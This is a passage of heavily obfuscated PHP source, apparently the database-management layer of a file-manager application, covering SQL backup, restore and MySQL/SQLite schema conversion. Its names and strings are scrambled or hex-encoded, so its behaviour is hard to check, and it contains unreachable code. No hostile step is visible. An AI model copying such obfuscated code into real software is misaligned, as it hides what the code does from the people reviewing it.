$ãæéÄÉ™[1141], $ãæéÄÉ™[1142], $ãæéÄÉ™[1143], $ãæéÄÉ™[1144], $ãæéÄÉ™[1145]), array($this->parseTable("{$å¬ºãî[$ãæéÄÉ™[359]]}"), $this->parseDistinct(isset($å¬ºãî[$ãæéÄÉ™[1146]]) ? $å¬ºãî[$ãæéÄÉ™[1146]] : !1), $this->parseField(!empty($å¬ºãî[$ãæéÄÉ™[353]]) ? $å¬ºãî[$ãæéÄÉ™[353]] : $ãæéÄÉ™[223]), $this->parseJoin(!empty($å¬ºãî[$ãæéÄÉ™[362]]) ? $å¬ºãî[$ãæéÄÉ™[362]] : $ãæéÄÉ™[12]), $this->parseWhere(!empty($å¬ºãî[$ãæéÄÉ™[355]]) ? $å¬ºãî[$ãæéÄÉ™[355]] : $ãæéÄÉ™[12]), $this->parseGroup(!empty($å¬ºãî[$ãæéÄÉ™[582]]) ? $å¬ºãî[$ãæéÄÉ™[582]] : $ãæéÄÉ™[12]), $this->parseHaving(!empty($å¬ºãî[$ãæéÄÉ™[1147]]) ? $å¬ºãî[$ãæéÄÉ™[1147]] : $ãæéÄÉ™[12]), $this->parseOrder(!empty($å¬ºãî[$ãæéÄÉ™[443]]) ? $å¬ºãî[$ãæéÄÉ™[443]] : $ãæéÄÉ™[12]), $this->parseLimit(!empty($å¬ºãî[$ãæéÄÉ™[370]]) ? $å¬ºãî[$ãæéÄÉ™[370]] : $ãæéÄÉ™[12]), $this->parseUnion(!empty($å¬ºãî[$ãæéÄÉ™[424]]) ? $å¬ºãî[$ãæéÄÉ™[424]] : $ãæéÄÉ™[12]), $this->parseComment(!empty($å¬ºãî[$ãæéÄÉ™[431]]) ? $å¬ºãî[$ãæéÄÉ™[431]] : $ãæéÄÉ™[12])), $úÑ©ıø); return $úÑ©ıø; } public function getLastSql($ÑÈ•‡Öà = '') { return $ÑÈ•‡Öà ? $this->modelSql[$ÑÈ•‡Öà] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¢¢×îËá) { return addslashes($¢¢×îËá); } public function setModel($ó·íä‰õ) { $this->model = $ó·íä‰õ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($‰Ú›ÏÂø = array()) { $çÏâÛ°² =& $_SERVER[ıÚ˜š²İ]; if (empty($‰Ú›ÏÂø)) { $‰Ú›ÏÂø = $GLOBALS[$çÏâÛ°²[6]][$çÏâÛ°²[21]]; } $this->database = $‰Ú›ÏÂø; } public function model($êÉ’¨Â¥ = '') { return new ModelBase($êÉ’¨Â¥, $_SERVER[ıÚ˜š²İ][12], $this->database); } public function db($’…¶ì°é = false) { $†¿ß“Àí =& $_SERVER[ıÚ˜š²İ]; $ï¹·ÊÄ = array_change_key_case($this->database); if ($this->dbType() == $†¿ß“Àí[13] || !$’…¶ì°é) { return $this->model()->db(); } $ˆ±©Ã¸ = $ï¹·ÊÄ[$†¿ß“Àí[1061]]; $ï¹·ÊÄ[$†¿ß“Àí[1061]] = $†¿ß“Àí[12]; if ($ï¹·ÊÄ[$†¿ß“Àí[1056]] == $†¿ß“Àí[1053]) { $ÅŸĞ¾ìÕ = $ï¹·ÊÄ[$†¿ß“Àí[1062]]; $ï¹·ÊÄ[$†¿ß“Àí[1062]] = substr($ÅŸĞ¾ìÕ, 0, strrpos($ÅŸĞ¾ìÕ, $†¿ß“Àí[1148])); } $this->database = $ï¹·ÊÄ; $‰ÆÀäÆç = $this->model()->db(); try { $ìì»ÆÒ = $‰ÆÀäÆç->execute("\x73\x68\157\x77\x20\144\141\164\x61\x62\x61\163\x65\x73\40\154\x69\x6b\x65\40\47{$ˆ±©Ã¸}\x27"); } catch (Exception $ÖõËàõ) { } if (!$ìì»ÆÒ) { $‰ÆÀäÆç->execute("\143\162\145\x61\x74\x65\40\144\x61\x74\x61\142\141\x73\x65\x20\x60{$ˆ±©Ã¸}\140"); } $ï¹·ÊÄ[$†¿ß“Àí[1061]] = $ˆ±©Ã¸; if ($ï¹·ÊÄ[$†¿ß“Àí[1056]] == $†¿ß“Àí[1053]) { $ï¹·ÊÄ[$†¿ß“Àí[1062]] .= $†¿ß“Àí[1148] . $ˆ±©Ã¸; } $this->database = $ï¹·ÊÄ; $‰ÆÀäÆç->execute("\x75\x73\x65\x20\140{$ˆ±©Ã¸}\140"); return $‰ÆÀäÆç; } public function createTable($Âû²ÀÈÍ, &$‹çâ¹É‚) { $à¬ØÅÑ´ =& $_SERVER[ıÚ˜š²İ]; if (!IO::exist($Âû²ÀÈÍ)) { ActionCall($à¬ØÅÑ´[1149], !0, 0); show_json(LNG($à¬ØÅÑ´[1150]), !1); } $ÊšëìÑ = $this->model()->db(); $µ€´û€Œ = sqlSplit(IO::getContent($Âû²ÀÈÍ)); foreach ($µ€´û€Œ as $ş¶¨”Íç) { $ãÍ¾ªŸş = stripos($ş¶¨”Íç, $à¬ØÅÑ´[1151]) === 0; if ($ãÍ¾ªŸş) { $‹çâ¹É‚->task[$à¬ØÅÑ´[1152]] += 1; } $ÊšëìÑ->execute($ş¶¨”Íç); if ($ãÍ¾ªŸş) { preg_match($à¬ØÅÑ´[1153], $ş¶¨”Íç, $ÀÍ£á«ª); $‹çâ¹É‚->task[$à¬ØÅÑ´[1154]] = $ÀÍ£á«ª[1]; $‹çâ¹É‚->update(1); } } } public function insertTable($ø‡¾èÕö, &$ã×èå­) { $Ó›Ô™¶œ =& $_SERVER[ıÚ˜š²İ]; $ä¢¸©ä = $this->model()->db(); $Ğä½ğ ı = $ÊôÃÂ¬œ ? array($ÊôÃÂ¬œ) : $ä¢¸©ä->getTables(); foreach ($ø‡¾èÕö as $ïØÊêÁ) { $ÊôÃÂ¬œ = basename($ïØÊêÁ, $Ó›Ô™¶œ[867]); if (!in_array($ÊôÃÂ¬œ, $Ğä½ğ ı)) { continue; } $ã×èå­->task[$Ó›Ô™¶œ[1154]] = $ÊôÃÂ¬œ; if (get_filesize($ïØÊêÁ) == 0) { continue; } $‹¢ÇÔ© = $this->sqlToDb($ïØÊêÁ, $ã×èå­); if (!$‹¢ÇÔ©) { ActionCall($Ó›Ô™¶œ[1149], !0, 0); show_json(LNG($Ó›Ô™¶œ[1155]) . "\x5b{$ÊôÃÂ¬œ}\135", !1); } } } public function sqlFromDb($Öìá…¶», $½Ãğ­¶™, &$”ËÂ·ô‰, $”æí»çš = '') { if ($”ËÂ·ô‰) { $”ËÂ·ô‰->task[$_SERVER[ıÚ˜š²İ][1154]] = $Öìá…¶»; } $„Ïòóıå = $this->model($Öìá…¶»); $¹ÆõÆæ = 0; $«§¢¶°– = 0; $´êÃÛø¥ = 10000; $‹˜³ã€î = fopen($½Ãğ­¶™, $_SERVER[ıÚ˜š²İ][1156]); $¸¨‡€Á‰ = $„Ïòóıå->getPk(); $Ú¬âôåå = $„Ïòóıå->getDbFields(); $Œ×Œùöõ = $_SERVER[ıÚ˜š²İ][12]; if ($GLOBALS[$_SERVER[ıÚ˜š²İ][866]] && in_array($Öìá…¶», array($_SERVER[ıÚ˜š²İ][1157], $_SERVER[ıÚ˜š²İ][1158]))) { $Œ×Œùöõ = $Öìá…¶»; } do { $×¯¨üñ = array($¸¨‡€Á‰ => array($_SERVER[ıÚ˜š²İ][1103], $«§¢¶°–)); $èœèÉŞÄ = $„Ïòóıå->where($×¯¨üñ)->field($Ú¬âôåå)->order($¸¨‡€Á‰ . $_SERVER[ıÚ˜š²İ][1159])->limit($´êÃÛø¥)->select(); $èœèÉŞÄ = !empty($èœèÉŞÄ) ? $èœèÉŞÄ : array(); if (!($ı‡¤ƒ§ = count($èœèÉŞÄ))) { break; } $íÛ¤ö®Š = end($èœèÉŞÄ); $«§¢¶°– = $íÛ¤ö®Š[$¸¨‡€Á‰]; $ƒ«››¯¥ = array(); foreach ($èœèÉŞÄ as $§é®¯¤´) { if ($Œ×Œùöõ) { if ($Öìá…¶» == $_SERVER[ıÚ˜š²İ][1157]) { if ($§é®¯¤´[$_SERVER[ıÚ˜š²İ][33]] == $_SERVER[ıÚ˜š²İ][1160]) { $Ôú–©éÜ = json_decode($§é®¯¤´[$_SERVER[ıÚ˜š²İ][452]], !0); if ($Ôú–©éÜ[$_SERVER[ıÚ˜š²İ][32]] == $GLOBALS[$_SERVER[ıÚ˜š²İ][866]] && $Ôú–©éÜ[$_SERVER[ıÚ˜š²İ][826]] != 1) { continue; } } } else { if ($§é®¯¤´[$_SERVER[ıÚ˜š²İ][33]] == $_SERVER[ıÚ˜š²İ][1161] && $§é®¯¤´[$_SERVER[ıÚ˜š²İ][97]] == $_SERVER[ıÚ˜š²İ][862]) { continue; } } } if ($”æí»çš) { $§é®¯¤´[$_SERVER[ıÚ˜š²İ][87]] = "\173\x69\157\72{$”æí»çš}\x7d" . substr($§é®¯¤´[$_SERVER[ıÚ˜š²İ][87]], strlen("\x7b\151\157\72{$§é®¯¤´[$_SERVER[ıÚ˜š²İ][900]]}\175")); $§é®¯¤´[$_SERVER[ıÚ˜š²İ][900]] = $”æí»çš; } $ƒ«››¯¥[] = $_SERVER[ıÚ˜š²İ][1162] . $this->sqlEncode($§é®¯¤´) . $_SERVER[ıÚ˜š²İ][1163]; } $¦ĞÁêâŞ = "\x49\116\123\105\122\x54\x20\x49\116\124\117\x20\140{$Öìá…¶»}\x60\40\x28\x60" . implode($_SERVER[ıÚ˜š²İ][1164], $Ú¬âôåå) . $_SERVER[ıÚ˜š²İ][1165]; fwrite($‹˜³ã€î, $¦ĞÁêâŞ . implode($_SERVER[ıÚ˜š²İ][1166], $ƒ«››¯¥) . $_SERVER[ıÚ˜š²İ][74] . PHP_EOL); $¹ÆõÆæ += $ı‡¤ƒ§; if ($”ËÂ·ô‰) { $”ËÂ·ô‰->update($ı‡¤ƒ§); } } while ($´êÃÛø¥ == $ı‡¤ƒ§); fclose($‹˜³ã€î); return $¹ÆõÆæ; } public function sqlToDb($–â¯îì, &$·í¦®ä¬) { $ä¦êöÓ =& $_SERVER[ıÚ˜š²İ]; $ğÄ• = $this->model()->db(); $èøĞÎêŸ = @fopen($–â¯îì, $ä¦êöÓ[1167]); if (!$èøĞÎêŸ) { return !1; } $àä€£²¯ = 0; $Ê»äıø¡ = $ä¦êöÓ[12]; $äè÷™Æï = array(); $ÜİóÒô = $this->dbType(); $ß¯¢°—Ÿ = $ÜİóÒô == $ä¦êöÓ[13] ? 500 : 2000; $ß„ €š¬ = basename($–â¯îì, $ä¦êöÓ[867]); $ëà·›„è = 0; $û“À˜Ëœ = 4194304; while (!feof($èøĞÎêŸ)) { $ÚÚ½Š¿ş = trim(fgets($èøĞÎêŸ)); if (!$ÚÚ½Š¿ş) { continue; } $¥åôªÚÕ = $this->sqlDecode($ÚÚ½Š¿ş, $ÜİóÒô, $ß„ €š¬); if (stripos($¥åôªÚÕ, $ä¦êöÓ[432]) === 0) { if (!$Ê»äıø¡) { $Ê»äıø¡ = $¥åôªÚÕ . $ä¦êöÓ[53]; } continue; } if ($·í¦®ä¬) { $·í¦®ä¬->task[$ä¦êöÓ[1152]] += 1; } $àä€£²¯++; $äè÷™Æï[] = rtrim(rtrim(trim($¥åôªÚÕ), $ä¦êöÓ[50]), $ä¦êöÓ[74]); $†¶×î¢Â = null; $’òİ€´û = strlen($¥åôªÚÕ); $ëà·›„è += $’òİ€´û; $ÍõÍ—ßÊ = strlen($Ê»äıø¡) + $ëà·›„è + (count($äè÷™Æï) - 1); if ($ÍõÍ—ßÊ >= $û“À˜Ëœ) { $†¶×î¢Â = array_pop($äè÷™Æï); if ($àä€£²¯ > 1) { $àä€£²¯--; } } if ($àä€£²¯ >= $ß¯¢°—Ÿ || $†¶×î¢Â) { $¥åôªÚÕ = $Ê»äıø¡ . implode($ä¦êöÓ[50], $äè÷™Æï); if (!$ğÄ•->execute($¥åôªÚÕ)) { return !1; } if ($·í¦®ä¬) { $·í¦®ä¬->update($àä€£²¯); } $äè÷™Æï = array(); $àä€£²¯ = 0; $ëà·›„è = 0; if ($†¶×î¢Â) { $äè÷™Æï = array($†¶×î¢Â); $àä€£²¯ = 1; $ëà·›„è = $’òİ€´û; } } } fclose($èøĞÎêŸ); if (!empty($äè÷™Æï)) { $¥åôªÚÕ = $Ê»äıø¡ . implode($ä¦êöÓ[50], $äè÷™Æï); if (!$ğÄ•->execute($¥åôªÚÕ)) { return !1; } if ($·í¦®ä¬) { $·í¦®ä¬->update($àä€£²¯); } } return !0; } public function dropTable($ÊÑÜ·½· = null) { $¤§Ï¾ = $this->model()->db(); $¨Ÿ£ôîê = $ÊÑÜ·½· ? array($ÊÑÜ·½·) : $¤§Ï¾->getTables(); if (!$¨Ÿ£ôîê) { return; } foreach ($¨Ÿ£ôîê as $ÊÑÜ·½·) { if ($ÊÑÜ·½·) { $ÊÑÜ·½· = strtolower($ÊÑÜ·½·); } else { continue; } $¤§Ï¾->execute("\144\x72\x6f\160\x20\x74\141\x62\154\x65\x20\x69\x66\40\145\x78\151\163\x74\163\x20\140{$ÊÑÜ·½·}\140"); } } private function sqlEncode($ˆÏËß™Š) { $ÄèúÌ‰¢ =& $_SERVER[ıÚ˜š²İ]; $“•ë³é³ = array(); foreach ($ˆÏËß™Š as $¯ÌÏçªã) { if (is_array($¯ÌÏçªã)) { $¯ÌÏçªã = json_encode_force($¯ÌÏçªã); } $¯ÌÏçªã = addslashes($¯ÌÏçªã); $¯ÌÏçªã = str_replace(array($ÄèúÌ‰¢[1168], $ÄèúÌ‰¢[288], $ÄèúÌ‰¢[419]), array($ÄèúÌ‰¢[1169], $ÄèúÌ‰¢[1170], $ÄèúÌ‰¢[1171]), $¯ÌÏçªã); $“•ë³é³[] = $¯ÌÏçªã; } return $ÄèúÌ‰¢[58] . implode($ÄèúÌ‰¢[1172], $“•ë³é³) . $ÄèúÌ‰¢[58]; } private function sqlDecode($º…©áò“, $Šçä­¯, $‹Š‡‡€ = '') { $»Ş¬¢‹ =& $_SERVER[ıÚ˜š²İ]; $º…©áò“ = str_replace(array($»Ş¬¢‹[1169], $»Ş¬¢‹[1170], $»Ş¬¢‹[1171]), array($»Ş¬¢‹[1168], $»Ş¬¢‹[288], $»Ş¬¢‹[419]), $º…©áò“); if ($Šçä­¯ == $»Ş¬¢‹[13]) { $º…©áò“ = str_ireplace($»Ş¬¢‹[1173], $»Ş¬¢‹[59], $º…©áò“); $º…©áò“ = stripslashes($º…©áò“); } return preg_replace($»Ş¬¢‹[1174], $»Ş¬¢‹[12], $º…©áò“); if ($Šçä­¯ == $»Ş¬¢‹[13]) { return $‹Š‡‡€ != $»Ş¬¢‹[861] ? stripslashes($º…©áò“) : $º…©áò“; } if ($‹Š‡‡€ == $»Ş¬¢‹[861]) { $º…©áò“ = str_replace($»Ş¬¢‹[1175], $»Ş¬¢‹[121], stripslashes($º…©áò“)); } return $º…©áò“; } public function getSqlFile($ŠÏ¬âì = '') { $ƒøÓèû =& $_SERVER[ıÚ˜š²İ]; $„¾Ğ‡Ç• = $this->dbType(!0); $ÅŞˆ¹ = CONTROLLER_DIR . "\151\x6e\163\164\141\x6c\154\x2f\x64\x61\x74\x61\x2f{$„¾Ğ‡Ç•}\x2e\x73\x71\154"; $Ëæ—û™ = file_get_contents($ÅŞˆ¹); $´Ø…õÚÔ = $ƒøÓèû[1176] . ($„¾Ğ‡Ç• == $ƒøÓèû[885] ? $ƒøÓèû[1177] : $ƒøÓèû[1178]) . $ƒøÓèû[1179]; preg_match_all($´Ø…õÚÔ, $Ëæ—û™, $™¦ÛÇ³); $¸¯Ú€Ÿ® = $™¦ÛÇ³[1]; $ò”¬‘­­ = $this->model()->db(); $Š™Ş¯¯ = $ò”¬‘­­->getTables(); $Í¤ãÇˆØ = TEMP_FILES . $ƒøÓèû[1180] . date($ƒøÓèû[262]) . $ƒøÓèû[8]; del_dir($Í¤ãÇˆØ); mk_dir($Í¤ãÇˆØ); $Ü¹ôƒ´‚ = $Í¤ãÇˆØ . $ƒøÓèû[1181]; $Ò¨¬±·ë = $Í¤ãÇˆØ . $ƒøÓèû[1182]; $Åè±íï = $„¾Ğ‡Ç• == $ƒøÓèû[13] ? $ƒøÓèû[885] : $ƒøÓèû[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\x61\154\x6c\57\144\141\164\141\57{$Åè±íï}\56\163\x71\154", $Í¤ãÇˆØ); @touch($Í¤ãÇˆØ . $„¾Ğ‡Ç• . $ƒøÓèû[867]); $ı¿öÑû = fopen($Ü¹ôƒ´‚, $ƒøÓèû[1156]); $ÔÎŒ¬Àæ = fopen($Ò¨¬±·ë, $ƒøÓèû[1156]); if ($„¾Ğ‡Ç• == $ƒøÓèû[13]) { $Š™Ş¯¯ = array_diff($Š™Ş¯¯, array($ƒøÓèû[859], $ƒøÓèû[860])); $Çâòâåû = array($ƒøÓèû[1183], $ƒøÓèû[1184], $ƒøÓèû[1185]); fwrite($ÔÎŒ¬Àæ, implode(PHP_EOL, $Çâòâåû) . PHP_EOL . PHP_EOL); foreach ($Š™Ş¯¯ as $İÂïÆä¶) { $·ÛùÎ×´ = $this->sqlFromSqlite($İÂïÆä¶); if (!$·ÛùÎ×´[$ƒøÓèû[13]]) { continue; } fwrite($ÔÎŒ¬Àæ, $·ÛùÎ×´[$ƒøÓèû[13]] . PHP_EOL . PHP_EOL); if (!in_array($İÂïÆä¶, $¸¯Ú€Ÿ®)) { fwrite($ı¿öÑû, $·ÛùÎ×´[$ƒøÓèû[885]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Š™Ş¯¯ as $İÂïÆä¶) { $·ÛùÎ×´ = $this->sqlFromMysql($İÂïÆä¶); if (!$·ÛùÎ×´[$ƒøÓèû[885]]) { continue; } fwrite($ı¿öÑû, $·ÛùÎ×´[$ƒøÓèû[885]] . PHP_EOL . PHP_EOL); if (!in_array($İÂïÆä¶, $¸¯Ú€Ÿ®)) { fwrite($ÔÎŒ¬Àæ, $·ÛùÎ×´[$ƒøÓèû[13]] . PHP_EOL . PHP_EOL); } } } fclose($ı¿öÑû); fclose($ÔÎŒ¬Àæ); $Ëæ—û™ = array($ƒøÓèû[885] => $Ü¹ôƒ´‚, $ƒøÓèû[13] => $Ò¨¬±·ë); return $ŠÏ¬âì ? $Ëæ—û™[$ŠÏ¬âì] : $Ëæ—û™; } public function dbType($Ü¥›ƒµ = false) { $Ò²ı´ÔÇ =& $_SERVER[ıÚ˜š²İ]; $†ÕŠù…ä = $Ü¥›ƒµ ? $GLOBALS[$Ò²ı´ÔÇ[6]][$Ò²ı´ÔÇ[21]] : $this->database; $†ÕŠù…ä = array_change_key_case($†ÕŠù…ä); $¥ş£Æ²² = $†ÕŠù…ä[$Ò²ı´ÔÇ[1056]]; if ($¥ş£Æ²² == $Ò²ı´ÔÇ[1053]) { $äãĞ¬—Ğ = explode($Ò²ı´ÔÇ[4], $†ÕŠù…ä[$Ò²ı´ÔÇ[1062]]); $¥ş£Æ²² = $äãĞ¬—Ğ[0]; } $ÕÓõ°¡ = array($Ò²ı´ÔÇ[1186] => $Ò²ı´ÔÇ[13], $Ò²ı´ÔÇ[1001] => $Ò²ı´ÔÇ[885]); if (isset($ÕÓõ°¡[$¥ş£Æ²²])) { $¥ş£Æ²² = $ÕÓõ°¡[$¥ş£Æ²²]; } return $¥ş£Æ²²; } public function sqlFromMysql($¬àúá¼, $¦‰¨Êó = '') { $û‡•¹«Ï =& $_SERVER[ıÚ˜š²İ]; $ú‘Èô›¯ = $this->model()->db(); $öÒ‰«Ì = $ú‘Èô›¯->query($û‡•¹«Ï[1187] . $¬àúá¼ . $û‡•¹«Ï[463]); if (!$öÒ‰«Ì || !$öÒ‰«Ì[0]) { return !1; } $•˜¶ºåÀ = _get($öÒ‰«Ì[0], $û‡•¹«Ï[1188], $û‡•¹«Ï[12]); if (!$•˜¶ºåÀ) { return !1; } $ ¸İÂı  = "\104\122\x4f\120\x20\124\x41\102\x4c\105\x20\111\106\x20\105\x58\x49\x53\x54\x53\x20\x60{$¬àúá¼}\x60\x3b" . PHP_EOL . $•˜¶ºåÀ . $û‡•¹«Ï[74]; if ($¦‰¨Êó && $¦‰¨Êó == $û‡•¹«Ï[885]) { return $ ¸İÂı ; } $‚¸“Ë…Œ = array_change_key_case($GLOBALS[$û‡•¹«Ï[6]][$û‡•¹«Ï[21]]); $ğ¡çÒåı = $‚¸“Ë…Œ[$û‡•¹«Ï[1061]]; $½‹½œİ® = $û‡•¹«Ï[1189] . $ğ¡çÒåı . $û‡•¹«Ï[1190] . $¬àúá¼ . $û‡•¹«Ï[58]; $Ó„¶Çé = $û‡•¹«Ï[1191] . $¬àúá¼ . $û‡•¹«Ï[989]; $ßî»³ãÔ = $ú‘Èô›¯->query($½‹½œİ®); if (empty($ßî»³ãÔ)) { $æÃé÷ì = array($û‡•¹«Ï[885] => $û‡•¹«Ï[12], $û‡•¹«Ï[13] => $û‡•¹«Ï[12]); return $¦‰¨Êó ? $æÃé÷ì[$¦‰¨Êó] : $æÃé÷ì; } $‘’Ô…´ = $ú‘Èô›¯->query($Ó„¶Çé); $°÷÷í = $û‡•¹«Ï[12]; $ãÜ–‹éª = array(); foreach ($‘’Ô…´ as $™¢¹”Ü) { if (!$°÷÷í && $™¢¹”Ü[$û‡•¹«Ï[1192]] == $û‡•¹«Ï[1193]) { $°÷÷í = $™¢¹”Ü[$û‡•¹«Ï[1194]]; } if (isset($ãÜ–‹éª[$™¢¹”Ü[$û‡•¹«Ï[1192]]])) { $ãÜ–‹éª[$™¢¹”Ü[$û‡•¹«Ï[1192]]][$û‡•¹«Ï[1195]][] = $™¢¹”Ü[$û‡•¹«Ï[1194]]; continue; } $ãÜ–‹éª[$™¢¹”Ü[$û‡•¹«Ï[1192]]] = array($û‡•¹«Ï[1196] => $™¢¹”Ü[$û‡•¹«Ï[1192]], $û‡•¹«Ï[1195] => array($™¢¹”Ü[$û‡•¹«Ï[1194]]), $û‡•¹«Ï[1197] => $™¢¹”Ü[$û‡•¹«Ï[1198]] == $û‡•¹«Ï[91] ? 0 : 1); } $çĞÂ’ñ¥ = array(); foreach ($ãÜ–‹éª as $™¢¹”Ü) { $©¶óÒÜ¡ = $™¢¹”Ü[$û‡•¹«Ï[1196]] == $û‡•¹«Ï[1193]; $®¶áÄ§„ = array($û‡•¹«Ï[1199], $™¢¹”Ü[$û‡•¹«Ï[1197]] == $û‡•¹«Ï[91] && !$©¶óÒÜ¡ ? $û‡•¹«Ï[1200] : $û‡•¹«Ï[12], $û‡•¹«Ï[1201], $û‡•¹«Ï[1202] . $¬àúá¼ . $û‡•¹«Ï[11] . ($©¶óÒÜ¡ ? $û‡•¹«Ï[1203] : $™¢¹”Ü[$û‡•¹«Ï[1196]]) . $û‡•¹«Ï[121], $û‡•¹«Ï[1204], $û‡•¹«Ï[121] . $¬àúá¼ . $û‡•¹«Ï[121], $û‡•¹«Ï[1205] . implode($û‡•¹«Ï[1206], $™¢¹”Ü[$û‡•¹«Ï[1195]]) . $û‡•¹«Ï[1207]); $çĞÂ’ñ¥[] = implode($û‡•¹«Ï[53], $®¶áÄ§„) . $û‡•¹«Ï[74]; } $Øà”ƒó§ = array(); $¢ó©œ«µ = array($û‡•¹«Ï[1208] => $û‡•¹«Ï[1209], $û‡•¹«Ï[1209] => $û‡•¹«Ï[1209], $û‡•¹«Ï[366] => $û‡•¹«Ï[392], $û‡•¹«Ï[365] => $û‡•¹«Ï[392]); foreach ($ßî»³ãÔ as $™¢¹”Ü) { $®¶áÄ§„ = array($û‡•¹«Ï[121] . $™¢¹”Ü[$û‡•¹«Ï[1210]] . $û‡•¹«Ï[121], isset($¢ó©œ«µ[$™¢¹”Ü[$û‡•¹«Ï[1211]]]) ? $¢ó©œ«µ[$™¢¹”Ü[$û‡•¹«Ï[1211]]] : $™¢¹”Ü[$û‡•¹«Ï[1212]], $™¢¹”Ü[$û‡•¹«Ï[1213]] == $û‡•¹«Ï[987] ? $û‡•¹«Ï[1214] : $û‡•¹«Ï[1215], $™¢¹”Ü[$û‡•¹«Ï[1210]] == $°÷÷í ? $û‡•¹«Ï[1216] : $û‡•¹«Ï[12], $™¢¹”Ü[$û‡•¹«Ï[1038]] ? strtoupper(str_replace($û‡•¹«Ï[11], $û‡•¹«Ï[12], $™¢¹”Ü[$û‡•¹«Ï[1038]])) : $û‡•¹«Ï[12]); $Øà”ƒó§[] = trim(implode($û‡•¹«Ï[53], $®¶áÄ§„)); } $Ûå á° = array($û‡•¹«Ï[1217] . $¬àúá¼ . $û‡•¹«Ï[1218], $û‡•¹«Ï[1219] . $¬àúá¼ . $û‡•¹«Ï[1220], implode($û‡•¹«Ï[50] . PHP_EOL, $Øà”ƒó§), $û‡•¹«Ï[1035]); $…ÙÈš—° = implode(PHP_EOL, array_merge($Ûå á°, $çĞÂ’ñ¥)); if ($¦‰¨Êó && $¦‰¨Êó == $û‡•¹«Ï[13]) { return $…ÙÈš—°; } $æÃé÷ì = array($û‡•¹«Ï[885] => $ ¸İÂı , $û‡•¹«Ï[13] => $…ÙÈš—°); return $¦‰¨Êó ? $æÃé÷ì[$¦‰¨Êó] : $æÃé÷ì; } public function sqlFromSqlite($—úŠÇ±ò, $§Ä¨ßì² = '') { $ˆ§–‘‡ =& $_SERVER[ıÚ˜š²İ]; $âÇÆƒØ÷ = $this->model()->db(); $ØôÁ”àè = "\x50\122\x41\107\115\x41\40\x54\x41\x42\114\x45\137\111\x4e\x46\x4f\40\x28\47{$—úŠÇ±ò}\47\x29"; $ÕğšÇ½Ï = "\123\x45\114\105\x43\124\40\x2a\x20\106\x52\117\x4d\x20\x73\x71\x6c\151\x74\x65\x5f\155\x61\x73\x74\145\x72\40\127\x48\x45\x52\105\40\164\x62\154\137\156\141\x6d\145\x20\75\x20\x27{$—úŠÇ±ò}\47"; $¨¾–…üŠ = $âÇÆƒØ÷->query($ØôÁ”àè); if (empty($¨¾–…üŠ)) { $‹„¼«Œ = array($ˆ§–‘‡[885] => $ˆ§–‘‡[12], $ˆ§–‘‡[13] => $ˆ§–‘‡[12]); return $§Ä¨ßì² ? $‹„¼«Œ[$§Ä¨ßì²] : $‹„¼«Œ; } $é¬¸ºÇ‡ = $âÇÆƒØ÷->query($ÕğšÇ½Ï); $³˜§êİ = $ô”¨¡¤ = array(); foreach ($é¬¸ºÇ‡ as $Ç®×Â¥ä) { if ($Ç®×Â¥ä[$ˆ§–‘‡[33]] == $ˆ§–‘‡[359]) { $³˜§êİ[] = $Ç®×Â¥ä[$ˆ§–‘‡[1221]]; } else { $ô”¨¡¤[$Ç®×Â¥ä[$ˆ§–‘‡[32]]] = $Ç®×Â¥ä[$ˆ§–‘‡[1221]]; } } $õ§¥Æ¥ = array_merge(array($ˆ§–‘‡[1217] . $—úŠÇ±ò . $ˆ§–‘‡[121]), $³˜§êİ, array_values($ô”¨¡¤)); $õ§¥Æ¥ = implode($ˆ§–‘‡[74] . PHP_EOL, $õ§¥Æ¥) . $ˆ§–‘‡[74]; if ($§Ä¨ßì² && $§Ä¨ßì² == $ˆ§–‘‡[13]) { return $õ§¥Æ¥; } $ö‰ıÛ¿ = array(); foreach ($ô”¨¡¤ as $¢ûÄÖÕé => $œãÛ«¦) { $·ŞŒãıÈ = str_replace($ˆ§–‘‡[1222] . $—úŠÇ±ò . $ˆ§–‘‡[11], $ˆ§–‘‡[12], $¢ûÄÖÕé); $·ŞŒãıÈ = str_replace($—úŠÇ±ò . $ˆ§–‘‡[11], $ˆ§–‘‡[12], $¢ûÄÖÕé); $ÙÁ¤€Æ = str_replace(array($ˆ§–‘‡[121], $ˆ§–‘‡[1046]), $ˆ§–‘‡[463], substr($œãÛ«¦, stripos($œãÛ«¦, $ˆ§–‘‡[340]))); $ö‰ıÛ¿[$·ŞŒãıÈ] = $ÙÁ¤€Æ; } $­„×ü¸¶ = array(); $½“¿ƒŸî = array($ˆ§–‘‡[1209] => $ˆ§–‘‡[1223], $ˆ§–‘‡[392] => $ˆ§–‘‡[1224]); $èâ£ìİ = $Ö…û“Šà = $ˆ§–‘‡[12]; foreach ($¨¾–…üŠ as $Ç®×Â¥ä) { if ($Ç®×Â¥ä[$ˆ§–‘‡[57]] == $ˆ§–‘‡[91]) { $èâ£ìİ = $Ç®×Â¥ä[$ˆ§–‘‡[32]]; } $Š¾å½ŠÉ = $Ç®×Â¥ä[$ˆ§–‘‡[33]]; if ($Š¾å½ŠÉ == $ˆ§–‘‡[1225] && isset($ö‰ıÛ¿[$Ç®×Â¥ä[$ˆ§–‘‡[32]]])) { $Š¾å½ŠÉ = $ˆ§–‘‡[1226]; } $Ù€İÊ‘› = array($ˆ§–‘‡[463] . $Ç®×Â¥ä[$ˆ§–‘‡[32]] . $ˆ§–‘‡[463], _get($½“¿ƒŸî, $Š¾å½ŠÉ, $Š¾å½ŠÉ), $Ç®×Â¥ä[$ˆ§–‘‡[35]] == $ˆ§–‘‡[91] ? $ˆ§–‘‡[1214] : $ˆ§–‘‡[1227] . $Ç®×Â¥ä[$ˆ§–‘‡[56]], $Ç®×Â¥ä[$ˆ§–‘‡[57]] == $ˆ§–‘‡[91] ? $ˆ§–‘‡[1228] : $ˆ§–‘‡[12]); $­„×ü¸¶[] = trim(implode($ˆ§–‘‡[53], $Ù€İÊ‘›)); } foreach ($ö‰ıÛ¿ as $·ŞŒãıÈ => $ÙÁ¤€Æ) { if ($·ŞŒãıÈ == $ˆ§–‘‡[1203]) { $·êÂ‹´ = $Ö…û“Šà = $ˆ§–‘‡[1229] . $èâ£ìİ . $ˆ§–‘‡[1230]; } else { $·êÂ‹´ = (stripos($·ŞŒãıÈ, $ˆ§–‘‡[11]) ? $ˆ§–‘‡[1231] : $ˆ§–‘‡[12]) . 